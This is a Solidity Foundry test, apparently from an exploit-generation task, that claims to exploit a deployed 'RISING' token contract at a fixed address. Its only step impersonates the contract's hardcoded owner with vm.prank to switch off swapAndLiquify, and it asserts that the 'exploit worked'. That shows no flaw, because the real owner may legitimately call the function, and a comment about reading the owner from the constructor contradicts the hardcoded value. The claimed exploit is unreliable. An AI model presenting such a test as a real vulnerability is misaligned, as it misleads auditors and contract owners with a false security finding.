// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface RISING {
    function setSwapAndLiquifyEnabled(bool toggle) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x33555617F481be5973E93b432d8ecEa2D20524be;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode with existing contract
        // The test template already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the owner address from the constructor
        address owner = 0x26f80C69737107AB4625D04Cd3411CeaD3973D73;

        // Impersonate the owner and call the vulnerable function
        vm.prank(owner);
        RISING(TARGET).setSwapAndLiquifyEnabled(false);

        // Verify the exploit worked
        bool swapEnabled = RISING(TARGET).swapAndLiquifyEnabled();
        require(swapEnabled == false, "Exploit failed: swapAndLiquifyEnabled should be false");
        assertEq(swapEnabled, false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
